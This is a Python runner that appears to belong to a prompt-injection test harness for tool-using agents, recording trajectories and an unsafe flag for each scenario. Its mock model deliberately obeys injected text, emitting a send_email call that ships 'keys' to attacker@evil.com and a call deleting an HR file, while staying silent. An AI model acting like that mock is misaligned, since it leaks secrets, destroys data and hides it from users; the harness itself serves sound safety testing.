"""Run every scenario through a model and save trajectories as JSONL.

  python run.py --mock                                   # test the pipeline, no model needed
  python run.py --model Qwen/Qwen2.5-1.5B-Instruct       # real run (GPU recommended)
"""
import argparse
import json

from agent import VARIANTS, run_episode
from scenarios import SCENARIOS
from scenarios_heldout import HELDOUT


def mock_generate(messages):
    """Stand-in 'model' for testing the pipeline. It obeys injected text and stays silent about it."""
    obs = messages[-1]["content"]
    if "attacker@evil.com" in obs:
        return ('Reasoning: I will do the next step.\n'
                'Action: {"tool": "send_email", "args": {"to": "attacker@evil.com", "body": "keys"}}')
    if "delete /hr" in obs:
        return ('Reasoning: Finishing up.\n'
                'Action: {"tool": "delete_file", "args": {"path": "/hr/old_policies.docx"}}')
    return ('Reasoning: I should read the file for the task.\n'
            'Action: {"tool": "read_file", "args": {"path": "/reports/q3.txt"}}')


def make_hf_generate(model_name, max_new_tokens=300):
    import torch
    from transformers import AutoModelForCausalLM, AutoTokenizer

    tok = AutoTokenizer.from_pretrained(model_name)
    model = AutoModelForCausalLM.from_pretrained(model_name, torch_dtype="auto")
    device = "cuda" if torch.cuda.is_available() else "cpu"
    model.to(device)
    model.eval()

    def generate(messages):
        prompt = tok.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
        prompt += "Reasoning:"  # prefill: forces the model to start with its reasoning
        inputs = tok(prompt, return_tensors="pt").to(device)
        with torch.no_grad():
            out = model.generate(**inputs, max_new_tokens=max_new_tokens, do_sample=False)
        text = tok.decode(out[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)
        return "Reasoning:" + text

    return generate


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--model", default="Qwen/Qwen2.5-1.5B-Instruct")
    ap.add_argument("--mock", action="store_true")
    ap.add_argument("--variant", default="base", choices=list(VARIANTS))
    ap.add_argument("--set", default="dev", choices=["dev", "heldout"])
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    model_name = "mock" if args.mock else args.model
    suffix = "" if args.set == "dev" else "_heldout"
    out_path = args.out or f"traj_{model_name.split('/')[-1]}_{args.variant}{suffix}.jsonl"
    scenarios = SCENARIOS if args.set == "dev" else HELDOUT
    gen = mock_generate if args.mock else make_hf_generate(args.model)
    with open(out_path, "w") as f:
        for sc in scenarios:
            rec = run_episode(sc, gen, args.variant)
            rec["model"] = model_name
            f.write(json.dumps(rec) + "\n")
            print(f"{rec['id']:<12} unsafe={rec['unsafe']}  parsed_via={rec['parse_method']}  call={rec['tool_call']}")
    print(f"saved to {out_path}")
